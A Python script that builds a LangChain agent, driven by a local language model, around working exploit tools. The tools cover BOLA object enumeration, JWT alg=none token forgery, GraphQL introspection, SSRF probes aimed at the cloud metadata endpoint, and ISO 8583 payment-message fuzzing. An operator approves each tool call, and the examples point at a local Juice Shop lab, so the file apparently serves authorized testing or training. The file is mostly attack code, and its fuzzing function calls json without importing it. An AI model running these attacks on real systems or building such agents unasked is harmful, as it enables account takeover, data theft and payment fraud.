"""
redteam_agent_hitl.py — Production red-team agent with HITL middleware wired in.

This is the Priority 3 deployment: our exploit tools wrapped as LangChain tools
with the RedTeamHITLMiddleware enforcing operator authorization on every call.

Usage:
    .venv312/Scripts/python.exe redteam_agent_hitl.py

Every tool call will pause at the HITL checkpoint. Type 'y' to authorize, 'n' to reject.
"""

import sys
sys.path.insert(0, ".")

from redteam_middleware import RedTeamHITLMiddleware, ToolRejected

# Import LangChain
try:
    from langchain.agents import create_agent
    from langchain_core.tools import tool
    from langchain_ollama import ChatOllama
except ImportError as e:
    print(f"Missing dependencies: {e}")
    print("Install with: .venv312/Scripts/python.exe -m pip install langchain langchain-ollama")
    sys.exit(1)


# =============================================================================
# RED-TEAM TOOLS (wrapped from our learning projects)
# =============================================================================

@tool
def bola_exploit(target_url: str, endpoint_template: str, id_range: str, auth_token: str) -> str:
    """
    Execute BOLA (Broken Object Level Authorization) exploit against an API.
    
    Args:
        target_url: Base URL of target (e.g., http://localhost:5016)
        endpoint_template: Path template with {id} placeholder (e.g., /api/Users/{id})
        id_range: Range of IDs to test, format "start-end" (e.g., "1-20")
        auth_token: JWT token for authenticated requests
    
    Returns:
        JSON summary of vulnerable IDs found
    """
    import urllib.request
    import urllib.error
    import json
    
    start, end = map(int, id_range.split("-"))
    findings = []
    base = target_url.rstrip("/")
    headers = {"Authorization": f"Bearer {auth_token}"}
    
    for rid in range(start, end + 1):
        path = endpoint_template.format(id=rid)
        req = urllib.request.Request(f"{base}{path}", headers=headers)
        try:
            with urllib.request.urlopen(req, timeout=5) as r:
                body = r.read()
                if r.status == 200 and len(body) > 10:
                    findings.append({
                        "path": path,
                        "id": rid,
                        "status": r.status,
                        "size": len(body),
                        "preview": body[:100].decode(errors="ignore"),
                    })
        except urllib.error.HTTPError:
            pass  # 404/403 = expected
    
    return json.dumps({"vuln_class": "BOLA", "findings": findings, "count": len(findings)}, indent=2)


@tool
def jwt_attack(legit_token: str, attack_type: str, target_url: str = "http://localhost:5016") -> str:
    """
    Forge and test JWT tokens against target.
    
    Args:
        legit_token: A valid JWT from the target (used as template)
        attack_type: One of "alg_none", "alg_none_sig", "alg_empty"
        target_url: Target base URL
    
    Returns:
        JSON result of forgery test
    """
    import base64
    import json
    import hmac
    import hashlib
    import urllib.request
    import urllib.error
    
    def b64url_encode(data: bytes) -> str:
        return base64.urlsafe_b64encode(data).rstrip(b"=").decode("ascii")
    
    def b64url_decode(data: str) -> bytes:
        padding = "=" * (-len(data) % 4)
        return base64.urlsafe_b64decode(data + padding)
    
    def jwt_decode(token: str):
        parts = token.split(".")
        header = json.loads(b64url_decode(parts[0]))
        payload = json.loads(b64url_decode(parts[1]))
        return header, payload, parts[2]
    
    def jwt_encode(header: dict, payload: dict, sig: bytes) -> str:
        h = b64url_encode(json.dumps(header, separators=(",", ":")).encode())
        p = b64url_encode(json.dumps(payload, separators=(",", ":")).encode())
        s = b64url_encode(sig) if sig else ""
        return f"{h}.{p}.{s}"
    
    header, payload, orig_sig = jwt_decode(legit_token)
    forgeries = []
    
    if attack_type == "alg_none":
        for alg in ["none", "None", "NONE"]:
            h = header.copy()
            h["alg"] = alg
            forgeries.append(jwt_encode(h, payload, b""))
    elif attack_type == "alg_none_sig":
        h = header.copy()
        h["alg"] = "none"
        forgeries.append(jwt_encode(h, payload, orig_sig.encode()))
    elif attack_type == "alg_empty":
        h = header.copy()
        h["alg"] = ""
        forgeries.append(jwt_encode(h, payload, b""))
    
    # Test each forgery
    results = []
    for token in forgeries:
        req = urllib.request.Request(
            f"{target_url}/api/Users/1",
            headers={"Authorization": f"Bearer {token}"}
        )
        try:
            with urllib.request.urlopen(req, timeout=5) as r:
                body = r.read().decode(errors="ignore")
                accepted = r.status == 200 and "admin" in body.lower()
                results.append({"token": token[:50] + "...", "status": r.status, "accepted": accepted})
        except urllib.error.HTTPError as e:
            results.append({"token": token[:50] + "...", "status": e.code, "accepted": False})
    
    return json.dumps({"attack_type": attack_type, "results": results}, indent=2)


@tool
def graphql_introspection(target_url: str = "http://localhost:5016") -> str:
    """
    Run GraphQL introspection query to leak full schema.
    
    Args:
        target_url: GraphQL endpoint base URL
    
    Returns:
        Schema info or error
    """
    import urllib.request
    import urllib.error
    import json
    
    INTROSPECTION = """
    {
      __schema {
        types { name kind fields { name type { name kind ofType { name } } } }
        queryType { name }
        mutationType { name }
      }
    }
    """
    
    body = json.dumps({"query": INTROSPECTION}).encode()
    req = urllib.request.Request(
        f"{target_url}/graphql",
        data=body,
        headers={"Content-Type": "application/json"},
        method="POST",
    )
    
    try:
        with urllib.request.urlopen(req, timeout=10) as r:
            data = json.loads(r.read())
            if "data" in data and "__schema" in data["data"]:
                schema = data["data"]["__schema"]
                types = [t for t in schema.get("types", []) if not t.get("name", "").startswith("__")]
                return json.dumps({
                    "introspection_enabled": True,
                    "total_types": len(schema.get("types", [])),
                    "user_types": len(types),
                    "sample_types": [t.get("name") for t in types[:10]],
                    "query_type": schema.get("queryType", {}).get("name"),
                    "mutation_type": schema.get("mutationType", {}).get("name"),
                }, indent=2)
            return json.dumps({"introspection_enabled": False, "response": data}, indent=2)
    except urllib.error.HTTPError as e:
        return json.dumps({"introspection_enabled": False, "error": f"HTTP {e.code}", "body": e.read().decode()[:200]}, indent=2)
    except Exception as e:
        return json.dumps({"introspection_enabled": False, "error": str(e)}, indent=2)


@tool
def ssrf_probe(target_url: str, ssrf_vector: str, payload: str) -> str:
    """
    Test SSRF via various vectors (file upload, webhook, profile image).
    
    Args:
        target_url: Target base URL
        ssrf_vector: One of "file_upload", "forgot_password", "profile_image"
        payload: SSRF target URL (e.g., http://169.254.169.254/latest/meta-data/)
    
    Returns:
        Test result
    """
    import urllib.request
    import urllib.error
    import json
    
    base = target_url.rstrip("/")
    results = []
    
    if ssrf_vector == "file_upload":
        # Upload file with SSRF payload embedded
        import io
        boundary = "----hitlboundary"
        png_header = b"\x89PNG\r\n\x1a\n"
        file_content = png_header + payload.encode() + b"\n"
        body = (
            f"--{boundary}\r\n"
            f'Content-Disposition: form-data; name="file"; filename="test.png"\r\n'
            f"Content-Type: image/png\r\n\r\n"
        ).encode() + file_content + f"\r\n--{boundary}--\r\n".encode()
        
        req = urllib.request.Request(
            f"{base}/api/Users/",
            data=body,
            headers={"Content-Type": f"multipart/form-data; boundary={boundary}"},
            method="POST",
        )
        try:
            with urllib.request.urlopen(req, timeout=5) as r:
                resp = r.read().decode(errors="ignore")
                results.append({"vector": "file_upload", "status": r.status, "reflected": "169.254" in resp or "metadata" in resp.lower(), "preview": resp[:300]})
        except urllib.error.HTTPError as e:
            results.append({"vector": "file_upload", "status": e.code, "error": e.read().decode()[:200]})
    
    elif ssrf_vector == "forgot_password":
        body = json.dumps({"email": "test@bionic.test", "securityAnswer": payload}).encode()
        req = urllib.request.Request(
            f"{base}/rest/user/reset-password",
            data=body,
            headers={"Content-Type": "application/json"},
            method="POST",
        )
        try:
            with urllib.request.urlopen(req, timeout=5) as r:
                resp = r.read().decode(errors="ignore")
                results.append({"vector": "forgot_password", "status": r.status, "leak": "metadata" in resp.lower() or "169.254" in resp, "preview": resp[:300]})
        except urllib.error.HTTPError as e:
            err = e.read().decode(errors="ignore")
            results.append({"vector": "forgot_password", "status": e.code, "leak": "metadata" in err.lower() or "169.254" in err, "error": err[:200]})
    
    elif ssrf_vector == "profile_image":
        body = json.dumps({"profileImage": payload}).encode()
        req = urllib.request.Request(
            f"{base}/api/Users/",
            data=body,
            headers={"Content-Type": "application/json"},
            method="POST",
        )
        try:
            with urllib.request.urlopen(req, timeout=5) as r:
                resp = r.read().decode(errors="ignore")
                results.append({"vector": "profile_image", "status": r.status, "preview": resp[:300]})
        except urllib.error.HTTPError as e:
            results.append({"vector": "profile_image", "status": e.code, "error": e.read().decode()[:200]})
    
    return json.dumps({"ssrf_tests": results}, indent=2)


@tool
def iso8583_fuzz(attack_vector: str, iterations: int = 1000) -> str:
    """
    Run ISO 8583 fuzzing attacks against the payment switch simulator.
    
    Args:
        attack_vector: One of "length_overflow", "bitmap_phantom", "amount_mismatch", "truncated_mti", "pan_padding", "velocity_check"
        iterations: Number of messages to generate per vector
    
    Returns:
        Fuzz results summary
    """
    import sys
    from pathlib import Path
    sys.path.insert(0, str(Path(__file__).parent))
    
    from iso8583_engine import ISO8583Message, PaymentSwitchSimulator
    import random
    import time
    
    def gen_random_pan():
        digits = [random.randint(0, 9) for _ in range(15)]
        total = 0
        for i, d in enumerate(reversed(digits)):
            if i % 2 == 0:
                d *= 2
                if d > 9: d -= 9
            total += d
        check = (10 - (total % 10)) % 10
        return "".join(str(d) for d in digits) + str(check)
    
    def gen_legit():
        msg = ISO8583Message(mti="0100")
        msg.set_field(2, gen_random_pan())
        msg.set_field(3, "000000")
        msg.set_field(4, f"{random.randint(100, 1000000):012d}")
        msg.set_field(7, "0828080000")
        msg.set_field(11, f"{random.randint(1, 999999):06d}")
        msg.set_field(41, "TERM0001")
        msg.set_field(49, "840")
        return msg
    
    attacks = {
        "length_overflow": lambda: (lambda m: (m.set_field(2, "9"*99), m)[1])(gen_legit()),
        "bitmap_phantom": lambda: (lambda m: (m.set_field(127, "phantom"), m)[1])(gen_legit()),
        "amount_mismatch": lambda: (lambda m: (m.set_field(4, "000000001000"), m.set_field(49, "392"), m)[1])(gen_legit()),
        "truncated_mti": lambda: (lambda m: (setattr(m, "mti", "01"), m)[1])(gen_legit()),
        "pan_padding": lambda: (lambda m: (m.set_field(2, "F" + gen_random_pan()[:-1]), m)[1])(gen_legit()),
        "velocity_check": lambda: (lambda m: (m.set_field(4, "999999999999"), m)[1])(gen_legit()),
    }
    
    if attack_vector not in attacks:
        return json.dumps({"error": f"Unknown vector: {attack_vector}. Available: {list(attacks.keys())}"}, indent=2)
    
    switch = PaymentSwitchSimulator()
    successes = 0
    errors = 0
    first_error = None
    
    for i in range(iterations):
        try:
            msg = attacks[attack_vector]()
            packed = msg.pack()
            result = switch.process(packed)
            successes += 1
        except Exception as e:
            errors += 1
            if first_error is None:
                first_error = {"type": type(e).__name__, "message": str(e)[:200]}
    
    return json.dumps({
        "attack_vector": attack_vector,
        "iterations": iterations,
        "packed_success": successes,
        "errors": errors,
        "first_error": first_error,
    }, indent=2)


# =============================================================================
# AGENT CONSTRUCTION WITH HITL MIDDLEWARE
# =============================================================================

def build_redteam_agent():
    """Build the red-team agent with HITL middleware."""
    
    # The HITL middleware — this is the control mechanism
    hitl = RedTeamHITLMiddleware(
        prompt_prefix="[REDTEAM HITL CHECKPOINT]",
        show_args=True,
        show_tool_schema=False,
    )
    
    # Use local Ollama model (no API key needed)
    # Make sure Ollama is running: ollama serve
    model = ChatOllama(
        model="deepseek-r1:8b",  # or your preferred local model
        base_url="http://localhost:11434",
        temperature=0.1,
    )
    
    # All our red-team tools
    tools = [
        bola_exploit,
        jwt_attack,
        graphql_introspection,
        ssrf_probe,
        iso8583_fuzz,
    ]
    
    agent = create_agent(
        model=model,
        tools=tools,
        system_prompt="""You are a red-team operator. You have access to exploit tools for:
- BOLA (Broken Object Level Authorization) testing
- JWT forgery attacks
- GraphQL introspection and DoS
- SSRF probing
- ISO 8583 payment message fuzzing

Every tool call REQUIRES explicit operator authorization via the HITL checkpoint.
You will present the target and parameters, and the operator decides yes/no.

Be precise. Report exactly what the tool returns. Never fabricate results.""",
        middleware=[hitl],  # <-- THE KEY LINE
    )
    
    return agent


def main():
    print("=" * 70)
    print(" RED-TEAM AGENT WITH HITL MIDDLEWARE")
    print("=" * 70)
    print("""
This agent wraps our exploit tools (BOLA, JWT, GraphQL, SSRF, ISO 8583)
with the RedTeamHITLMiddleware. EVERY tool call pauses for your authorization.

Controls:
  y / yes  = authorize the tool call (it executes at FULL capability)
  n / no   = reject the tool call (ToolRejected raised, tool NEVER runs)
  garbage  = re-prompts until valid
  Ctrl-C   = treated as rejection (fail-safe)

Prerequisites:
  - Ollama running locally (ollama serve)
  - Target services running (Juice Shop on :5016, etc.)
  - Valid JWT tokens for authenticated exploits
""")
    
    agent = build_redteam_agent()
    
    print("\nAgent ready. Example tasks:")
    print("  - 'Run BOLA on http://localhost:5016 /api/Users/{id} 1-20 with token <JWT>'")
    print("  - 'Test JWT alg=none attack with token <JWT> on http://localhost:5016'")
    print("  - 'Run GraphQL introspection on http://localhost:5016'")
    print("  - 'Probe SSRF via forgot_password with payload http://169.254.169.254/latest/meta-data/'")
    print("  - 'Fuzz ISO 8583 amount_mismatch for 5000 iterations'")
    print("\nType 'quit' to exit.\n")
    
    while True:
        try:
            user_input = input(">>> ").strip()
            if user_input.lower() in ("quit", "exit", "q"):
                print("Exiting.")
                break
            if not user_input:
                continue
            
            print("\n--- Agent running ---")
            result = agent.invoke({"messages": [{"role": "user", "content": user_input}]})
            print(f"\nFinal response: {result['messages'][-1].content[:500]}")
            print("--- Done ---\n")
            
        except ToolRejected as e:
            print(f"\n[BLOCKED] Operator rejected: {e.tool_name}")
            print(f"  Args: {e.tool_args}")
        except KeyboardInterrupt:
            print("\nInterrupted. Type 'quit' to exit.")
        except Exception as e:
            print(f"\nError: {type(e).__name__}: {e}")


if __name__ == "__main__":
    main()